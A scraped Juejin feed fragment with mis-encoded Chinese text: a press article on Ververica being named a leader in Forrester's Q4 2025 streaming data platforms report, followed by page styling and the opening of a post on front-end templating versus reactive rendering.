.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿‘æ—¥ï¼Œå…¨çƒæƒå¨ç ”ç©¶æœºæ„Forresteræ­£å¼å‘å¸ƒã€ŠThe Forrester Waveâ„¢: Streaming Data Platforms, Q4 2025ã€‹æŠ¥å‘Šï¼ˆåç®€ç§°â€œæŠ¥å‘Šâ€ï¼‰ï¼ŒVervericaé¦–æ¬¡è¿›å…¥é¢†å¯¼è€…è±¡é™ï¼Œæˆä¸ºè¯¥å¹´åº¦æŠ¥å‘Šä¸­æœ€å—å…³æ³¨çš„"æ–°æ™‹é¢†å¯¼è€…"ã€‚è¿™ä¸€çªç ´æ€§æˆå°±æ ‡å¿—ç€Ververicaåœ¨å…¨çƒæµå¼æ•°æ®å¹³å°é¢†åŸŸçš„æŠ€æœ¯å®åŠ›å’Œå¸‚åœºå½±å“åŠ›è·å¾—è¡Œä¸šè®¤å¯ï¼Œå…¶åœ¨å®æ—¶AIé¢†åŸŸçš„åˆ›æ–°èƒ½åŠ›å°¤ä¸ºçªå‡ºã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79eb6c64555644e1b4ff2b2bf20fa215~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766050067&amp;x-signature=DTjK%2BgYHq1s8SYVpIPejEIp2394%3D" alt="" loading="lazy"/></p>
<p>Ververicaä½œä¸ºä¸€å®¶ä¸“æ³¨äºæµå¼æ•°æ®å¤„ç†çš„æµ·å¤–ä¼ä¸šï¼Œç”±Apache Flinkçš„åˆ›å§‹å›¢é˜Ÿåˆ›ç«‹ï¼Œäº2019å¹´è¢«é˜¿é‡Œå·´å·´é›†å›¢æ”¶è´­ã€‚å‡­å€Ÿå¯¹Apache Flinkæ ¸å¿ƒæŠ€æœ¯çš„æ·±åº¦ä¼˜åŒ–å’Œä¼ä¸šçº§äº§å“åŒ–èƒ½åŠ›ï¼ŒVervericaå·²æˆä¸ºå…¨çƒä¼ä¸šæ„å»ºå®æ—¶æ•°æ®åŸºç¡€è®¾æ–½çš„é¦–é€‰åˆä½œä¼™ä¼´ï¼Œå…¶å®¢æˆ·æ¶µç›–é‡‘èã€åˆ¶é€ ã€é›¶å”®ã€èƒ½æºç­‰å¤šä¸ªå…³é”®è¡Œä¸šï¼ŒåŒ…æ‹¬å®é©¬ã€Booking.comã€ç©ºä¸­å®¢è½¦ã€å½­åšç¤¾ç­‰å…¨çƒçŸ¥åä¼ä¸šã€‚Ververicaæ”¯æŒçµæ´»çš„å¤šäº‘éƒ¨ç½²æ¶æ„ï¼Œæ»¡è¶³ä¼ä¸šå…¬æœ‰äº‘ã€ç§æœ‰äº‘ã€æœ¬åœ°éƒ¨ç½²çš„å¤æ‚éƒ¨ç½²éœ€æ±‚ã€‚ä¸æ­¤åŒæ—¶ï¼ŒVervericaä¸é˜¿é‡Œå·´å·´æºæ‰‹æŒç»­ä¸»å¯¼Apache Flinkå¼€æºç¤¾åŒºå‘å±•ï¼ŒåŒæ–¹æŒç»­è´¡çŒ®æ ¸å¿ƒä»£ç ï¼Œæ¨åŠ¨æµè®¡ç®—æŠ€æœ¯åˆ›æ–°ï¼Œå¹¶ååŒå»ºè®¾å•†ä¸šåŒ–ç‰ˆæœ¬çš„ä¼ä¸šçº§èƒ½åŠ›ï¼Œä¸ºå…¨çƒç”¨æˆ·æä¾›ä»å¼€æºåˆ°å•†ä¸šåŒ–çš„å®Œæ•´ä»·å€¼é“¾æ¡ã€‚</p>
<p>Forresteråœ¨æŠ¥å‘Šä¸­å¯¹Ververicaç»™äºˆäº†é«˜åº¦è¯„ä»·ï¼Œç‰¹åˆ«æŒ‡å‡ºï¼š"Ververica èšç„¦äºæå‡ Flink çš„æ€§èƒ½ä¸æ‰©å±•èƒ½åŠ›ï¼ŒåŠ©åŠ›ä¼ä¸šè½»æ¾æ‹¥æŠ±çµæ´»ã€é«˜ååçš„æµå¤„ç†è§£å†³æ–¹æ¡ˆï¼Œå› è€Œå¹¿å—é‡‡ç”¨ã€‚"ï¼Œå¹¶èµèµå…¶"åœ¨æœ¬åœ°ã€å…¬æœ‰äº‘åŠè‡ªå¸¦äº‘ç¯å¢ƒä¸­ï¼ˆBYOCï¼‰çš„å…¨åœºæ™¯éƒ¨ç½²èƒ½åŠ›"ã€‚å°¤ä¸ºå¼•äººæ³¨ç›®çš„æ˜¯ï¼ŒVervericaåœ¨åŒ…æ‹¬"åˆ›æ–°æ€§"åœ¨å†…çš„ä¸ƒé¡¹å…³é”®è¯„ä¼°æ ‡å‡†ä¸­è·å¾—æœ€é«˜è¯„åˆ†ï¼Œè¿™ä¸€æˆç»©åœ¨é¦–æ¬¡å…¥é€‰é¢†å¯¼è€…è±¡é™çš„ä¼ä¸šä¸­æä¸ºç½•è§ã€‚</p>
<p>ä½œä¸ºApache FlinkæŠ€æœ¯çš„å¥ åŸºè€…ï¼ŒVervericaæ­¤æ¬¡å…¥é€‰é¢†å¯¼è€…è±¡é™å½°æ˜¾äº†å…¶åœ¨æµå¼æ•°æ®å¤„ç†é¢†åŸŸçš„æ·±åšç§¯ç´¯ã€‚Forresteråˆ†æå¸ˆè®¤ä¸ºï¼ŒVervericaå¼ºå¤§çš„Apache Flinkæ ¸å¿ƒä½¿å…¶èƒ½å¤Ÿ"ä¸ºä¼ä¸šå¤„ç†å¤§è§„æ¨¡å®æ—¶æ•°æ®å·¥ä½œè´Ÿè½½æä¾›é«˜æ•ˆç‡å’Œå¯æ‰©å±•æ€§"ã€‚åœ¨å…¨çƒä¼ä¸šåŠ é€Ÿå‘å®æ—¶AIè½¬å‹çš„èƒŒæ™¯ä¸‹ï¼ŒVervericaçš„ç»Ÿä¸€æµæ•°æ®å¹³å°æ­£æˆä¸ºè¿æ¥æ•°æ®æµåŠ¨ä¸æ™ºèƒ½å†³ç­–çš„å…³é”®çº½å¸¦ï¼Œæ”¯æŒä»å®æ—¶æ¬ºè¯ˆæ£€æµ‹ã€ç‰©è”ç½‘è®¾å¤‡ç›‘æ§åˆ°AIä»£ç†è‡ªä¸»å†³ç­–ç­‰å¤šæ ·åŒ–åº”ç”¨åœºæ™¯ã€‚</p>
<p>Forrester è¯„ä¼°æŠ¥å‘Šå¯¹ Ververica çš„å…³é”®å‘ç°åŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p>æˆ˜ç•¥è§†é‡çªå‡ºï¼šVerverica èµ‹èƒ½ä¼ä¸šåŸºäºå¤šç§éƒ¨ç½²æ¨¡å¼ï¼Œæ„å»ºå®æ—¶åˆ†æä¸AIé©±åŠ¨çš„åº”ç”¨ã€‚</p>
</li>
<li>
<p>èƒ½åŠ›é¢†å…ˆï¼šå…¶é«˜ååæµå¤„ç†å¼•æ“ä¸èµ„æºä¼˜åŒ–æŠ€æœ¯ï¼Œå¯ä»å®¹åº”å¯¹æœ€ä¸¥è‹›çš„æ•°æ®ä¸AIå·¥ä½œè´Ÿè½½ã€‚</p>
</li>
<li>
<p>å®¢æˆ·é«˜åº¦ä¿¡èµ–ï¼šç”¨æˆ·æ™®éè®¤å¯ Ververica åœ¨æ€§èƒ½ã€ç¨³å®šæ€§æ–¹é¢çš„è¡¨ç°ï¼Œä»¥åŠå…¶ä¸ Apache Flink åœ¨å®æ—¶æ•°æ®å¤„ç†ä¸Šçš„æ·±åº¦é›†æˆä¼˜åŠ¿ã€‚</p>
</li>
</ul>
<p>æœ¬æ¬¡æŠ¥å‘Šä¸­ï¼Œé™¤Ververicaå¤–ï¼Œå¾®è½¯ã€è°·æ­Œã€ç”²éª¨æ–‡ç­‰å›½é™…ç§‘æŠ€å·¨å¤´ï¼Œä»¥åŠä¸“æ³¨æµå¼æ•°æ®å¹³å°çš„å‚å•†Confluentä¹Ÿå…¥é€‰äº†é¢†å¯¼è€…è±¡é™ã€‚æ­¤æ¬¡æŠ¥å‘Šåæ˜ å‡ºæµå¼æ•°æ®å¹³å°å¸‚åœºå‘ˆç°"å·¨å¤´ä¸ä¸“ä¸šå‚å•†å¹¶å­˜"çš„ç«äº‰æ ¼å±€ï¼ŒVervericaä½œä¸ºä¸“æ³¨Apache Flinkç”Ÿæ€çš„ä¸“ä¸šå‚å•†ï¼Œå…¶é¦–æ¬¡å…¥é€‰é¢†å¯¼è€…è±¡é™å‡¸æ˜¾äº†å¼€æºæŠ€æœ¯åœ¨ä¼ä¸šçº§åº”ç”¨ä¸­çš„é‡è¦ä»·å€¼ã€‚</p>
<p>æ­¤æ¬¡Forrester WaveæŠ¥å‘Šçš„å‘å¸ƒï¼Œä¸ºæ­£åœ¨è¯„ä¼°æµå¼æ•°æ®å¹³å°è§£å†³æ–¹æ¡ˆçš„ä¼ä¸šæä¾›äº†æƒå¨çš„é€‰å‹å‚è€ƒã€‚Ververicaé¦–æ¬¡è¿›å…¥é¢†å¯¼è€…è±¡é™ï¼Œä¸ä»…æ ‡å¿—ç€å…¶æŠ€æœ¯èƒ½åŠ›å’Œå•†ä¸šæˆåŠŸçš„åŒé‡çªç ´ï¼Œæ›´ä¸ºå…¨çƒä¼ä¸šè¿ˆå‘å®æ—¶æ™ºèƒ½æ—¶ä»£æä¾›äº†åšå®çš„æŠ€æœ¯åŸºçŸ³ã€‚åœ¨æ•°æ®ä¸AIæ·±åº¦èåˆçš„æ–°çºªå…ƒï¼ŒVervericaæ­£ä»¥å…¶å“è¶Šçš„æµå¼è®¡ç®—èƒ½åŠ›ï¼Œå¼•é¢†å®æ—¶æ•°æ®å¤„ç†æŠ€æœ¯çš„æœªæ¥å‘å±•ã€‚</p>
<p>Forrester does not endorse any company, product, brand, or service included in its research publications and does not advise any person to select the products or services of any company or brand based on the ratings included in such publications. Information is based on the best available resources. Opinions reflect judgment at the time and are subject to change. For more information, read about Forresterâ€™s objectivity <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.forrester.com%2Fpolicies%2Fintegrity-policy%2F" target="_blank" title="https://www.forrester.com/policies/integrity-policy/" ref="nofollow noopener noreferrer">here</a>â€¯.</p>
<p>æŠ¥å‘Šä¸‹è½½åœ°å€</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Freprint.forrester.com%2Freports%2Fthe-forrester-wave-tm-streaming-data-platforms-q4-2025-37cd251a%2Findex.html" target="_blank" title="https://reprint.forrester.com/reports/the-forrester-wave-tm-streaming-data-platforms-q4-2025-37cd251a/index.html" ref="nofollow noopener noreferrer">reprint.forrester.com/reports/theâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»æ¨¡æ¿æ¸²æŸ“åˆ°å“åº”å¼é©±åŠ¨ï¼šå‰ç«¯å´›èµ·çš„æŠ€æœ¯æ¼”è¿›ä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7582358932028080143</link>    <guid>https://juejin.cn/post/7582358932028080143</guid>    <pubDate>2025-12-11T09:28:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582358932028080143" data-draft-id="7582149417768845362" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»æ¨¡æ¿æ¸²æŸ“åˆ°å“åº”å¼é©±åŠ¨ï¼šå‰ç«¯å´›èµ·çš„æŠ€æœ¯æ¼”è¿›ä¹‹è·¯"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-11T09:28:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è°è¨€è¥¿è¥¿é‡Œ"/> <meta itemprop="url" content="https://juejin.cn/user/332466136029851"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»æ¨¡æ¿æ¸²æŸ“åˆ°å“åº”å¼é©±åŠ¨ï¼šå‰ç«¯å´›èµ·çš„æŠ€æœ¯æ¼”è¿›ä¹‹è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/332466136029851/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è°è¨€è¥¿è¥¿é‡Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T09:28:17.000Z" title="Thu Dec 11 2025 09:28:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">å¼•è¨€ï¼šç•Œé¢æ˜¯å¦‚ä½•â€œåŠ¨â€èµ·æ¥çš„ï¼Ÿ</h2>
<p>ä¸è®ºæ˜¯ç”¨æˆ·çœ‹åˆ°çš„å“ªä¸ªé¡µé¢ï¼Œéƒ½ä¸åº”è¯¥æ˜¯ä¸€æˆä¸å˜çš„é™æ€ HTMLã€‚</p>
<p>å¾…åŠäº‹é¡¹çš„å¢åˆ ã€å•†å“åº“å­˜çš„å®æ—¶å˜åŒ–ï¼Œè¿˜æ˜¯èŠå¤©æ¶ˆæ¯çš„å³æ—¶æ¨é€ï¼Œéƒ½è®©é¡µé¢æŒ‡å‘äº†ä¸€ä¸ªå¿…éœ€åŠŸèƒ½â€”â€”â€”â€”<strong>ç•Œé¢å¿…é¡»è¦éšç€æ•°æ®çš„å˜åŒ–è€Œè‡ªåŠ¨æ›´æ–°</strong>ã€‚</p>
<p>è€Œå›´ç»•ç€è¿™ä¸€æ ¸å¿ƒè¯‰æ±‚ï¼Œå‡ºç°äº†ä¸¤æ¡ä¸»æµè·¯å¾„ï¼š</p>
<ul>
<li><strong>åç«¯åŠ¨æ€ç”ŸæˆHTMLï¼ˆä¼ ç»Ÿçš„ MVC æ¨¡å¼ï¼‰</strong>ï¼š
æ•°æ®åœ¨æœåŠ¡ç«¯ç»„è£…æˆå®Œæ•´é¡µé¢ï¼Œå†ä¸€æ¬¡æ€§è¿”è¿˜ç»™æµè§ˆå™¨ã€‚</li>
<li><strong>å‰ç«¯æ¥ç®¡ç•Œé¢æ›´æ–°ï¼ˆç°ä»£å“åº”å¼èŒƒå¼ï¼‰</strong>ï¼š
